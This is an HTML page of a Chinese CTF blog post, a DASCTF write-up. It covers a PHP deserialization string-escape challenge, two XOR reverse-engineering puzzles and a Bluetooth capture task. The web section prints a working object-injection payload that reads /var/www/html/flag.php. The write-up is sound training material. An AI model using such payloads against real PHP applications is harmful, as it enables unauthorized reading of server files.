@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-cn">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,misc,reverse,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言打了DASCTF发现自己太菜了，想拿个好看的名次还是要全面发展的，哭。 webezunserialize 考点：php反序列化字符串逃逸  php代码审计 1234567891011121314151617181920212223242526272829303132333435363738394041424344&amp;lt;?phpfunction write($data)&amp;#123;    re">
+<meta name="keywords" content="ctf,web,misc,reverse">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTFwriteup">
+<meta property="og:url" content="http://www.star123.top/2020/04/25/DASCTFwriteup/index.html">
+<meta property="og:site_name" content="star&#39;s blog">
+<meta property="og:description" content="前言打了DASCTF发现自己太菜了，想拿个好看的名次还是要全面发展的，哭。 webezunserialize 考点：php反序列化字符串逃逸  php代码审计 1234567891011121314151617181920212223242526272829303132333435363738394041424344&amp;lt;?phpfunction write($data)&amp;#123;    re">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="https://i.loli.net/2020/04/26/xpuwNQ1KySiZmXj.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/26/cD6H1PFniZMGSIb.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/26/qS9M6srV3AtYG4H.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/26/zIRrBNDtb7oTsyw.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/26/zIRrBNDtb7oTsyw.png">
+<meta property="og:updated_time" content="2020-04-26T10:44:11.770Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DASCTFwriteup">
+<meta name="twitter:description" content="前言打了DASCTF发现自己太菜了，想拿个好看的名次还是要全面发展的，哭。 webezunserialize 考点：php反序列化字符串逃逸  php代码审计 1234567891011121314151617181920212223242526272829303132333435363738394041424344&amp;lt;?phpfunction write($data)&amp;#123;    re">
+<meta name="twitter:image" content="https://i.loli.net/2020/04/26/xpuwNQ1KySiZmXj.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.star123.top/2020/04/25/DASCTFwriteup/">
+
+
+
+
+
+  <title>DASCTFwriteup | star's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">star's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2020/04/25/DASCTFwriteup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="star">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="star's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DASCTFwriteup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-25T21:52:45+08:00">
+                2020-04-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打了DASCTF发现自己太菜了，想拿个好看的名次还是要全面发展的，哭。</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezunserialize"><a href="#ezunserialize" class="headerlink" title="ezunserialize"></a>ezunserialize</h3><ul>
+<li>考点：php反序列化字符串逃逸</li>
+</ul>
+<p>php代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span> . <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>], $_GET[<span class="string">'b'</span>]);</span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure>
+
+<p>首先pop链很明显了，由B的_destruct()方法中的字符串拼接触发C的_toString()方法获取flag.php。</p>
+<p>然后我们看到read方法，把’\0\0\0’字符串替换为chr(0) . ‘*’ . chr(0)，而且read方法是在获取反序列化字符串才进行操作的，也就是说将6个字符的串换位3个字符的串，很明显是反序列化逃逸。</p>
+<p>那要如何逃逸呢？输入username和password时候，如果能够将后面输入的password字符串替换为B的对象，那么就可以达到利用的效果。利用的时候要注意几个点，首先需要计算出需要逃逸的字符串长度，我们目的是为了覆盖password字段的属性，所以如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";s:8:"</span>password<span class="string">";s:74:"</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>只有字段字符被覆盖的情况下我们才可能注入一个B的恶意对象，并且由于我们是要从6个字符中逃逸3个字符，所以被压入username长度需要为3的整数倍，这里测试之后，我们发现这个长度最好是24,利用代码如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$finall_a = <span class="string">'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0'</span>;</span><br><span class="line">$finall_b = <span class="string">'1";s:8:"password";O:1:"B":1:&#123;s:1:"b";O:1:"C":1:&#123;s:1:"c";s:22:"/var/www/html/flag.php";&#125;&#125;&#125;";&#125;'</span>;<span class="comment">//这里需要重新补充一个s:8:"password"使对象能够被正常反序列化。</span></span><br><span class="line"><span class="keyword">echo</span> urlencode($finall_a) . PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> urlencode($finall_b) . PHP_EOL;</span><br></pre></td></tr></table></figure>
+
+<p>最后getflag</p>
+<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="逆向入门"><a href="#逆向入门" class="headerlink" title="逆向入门"></a>逆向入门</h3><p>先跑一下<br><img src="https://i.loli.net/2020/04/26/xpuwNQ1KySiZmXj.png" alt="image.png"><br>找核心代码<br><img src="https://i.loli.net/2020/04/26/cD6H1PFniZMGSIb.png" alt="image.png"><br>简单的xor</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keys=<span class="string">'akhb~chdaZrdaZudqduvdZvvv|'</span></span><br><span class="line">real=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">    real+=chr((ord(i)<span class="number">-1</span>)^<span class="number">6</span>)</span><br><span class="line">print(real)</span><br></pre></td></tr></table></figure>
+
+<h3 id="100分的逆向"><a href="#100分的逆向" class="headerlink" title="100分的逆向"></a>100分的逆向</h3><p>一样的思路</p>
+<p>找关键代码 Please input your magic number</p>
+<p>发现v16到v53是一串数字，目测是数组，提取出来先。</p>
+<p>逻辑是先输入一个大于9的数，然后在输入等长度的一串字符，这串字符的每一个字符会和v10亦或n次，最后相当于之前的数组亦或一个定值得到flag。</p>
+<p><img src="https://i.loli.net/2020/04/26/qS9M6srV3AtYG4H.png" alt="image.png"></p>
+<p>基本上就是a^v10=flag，这个v10 我们用明文flag{猜测一下，结果发现v10是64。那么就是和上面一样的操作了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arr=[<span class="number">38</span>,<span class="number">44</span>,<span class="number">33</span>,<span class="number">39</span>,<span class="number">59</span>,<span class="number">35</span>,<span class="number">34</span>,<span class="number">115</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">113</span>,<span class="number">33</span>,<span class="number">36</span>,<span class="number">117</span>,<span class="number">118</span>,<span class="number">119</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">38</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">38</span>,<span class="number">34</span>,<span class="number">113</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">36</span>,<span class="number">112</span>,<span class="number">115</span>,<span class="number">118</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">35</span>,<span class="number">37</span>,<span class="number">121</span>,<span class="number">61</span>]</span><br><span class="line"></span><br><span class="line">result=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    result+=chr(<span class="number">64</span>^i)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>两个签到题我就不写了。</p>
+<h3 id="blueshark"><a href="#blueshark" class="headerlink" title="blueshark"></a>blueshark</h3><p>蓝牙抓包分析</p>
+<p><img src="https://i.loli.net/2020/04/26/zIRrBNDtb7oTsyw.png" alt="image.png"></p>
+<p>找到一个特别的东西，把zip包的按照hex dump出来，010editor hex import，拿到压缩包。</p>
+<p>压缩包提示密码就是pin值。</p>
+<p>包不多，随便找下就好了。<br><img src="https://i.loli.net/2020/04/26/zIRrBNDtb7oTsyw.png" alt="image.png"></p>
+<p>解压就是flag</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有道web没做，有点可惜。下回有空复现。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/misc/" rel="tag"># misc</a>
+          
+            <a href="/tags/reverse/" rel="tag"># reverse</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/23/ha1ctf部分web题解/" rel="next" title="ha1ctf部分web题解">
+                <i class="fa fa-chevron-left"></i> ha1ctf部分web题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">star</p>
+              <p class="site-description motion-element" itemprop="description">ctf wp and technologies about security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezunserialize"><span class="nav-number">2.1.</span> <span class="nav-text">ezunserialize</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse"><span class="nav-number">3.</span> <span class="nav-text">reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#逆向入门"><span class="nav-number">3.1.</span> <span class="nav-text">逆向入门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#100分的逆向"><span class="nav-number">3.2.</span> <span class="nav-text">100分的逆向</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">4.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#blueshark"><span class="nav-number">4.1.</span> <span class="nav-text">blueshark</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">star</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
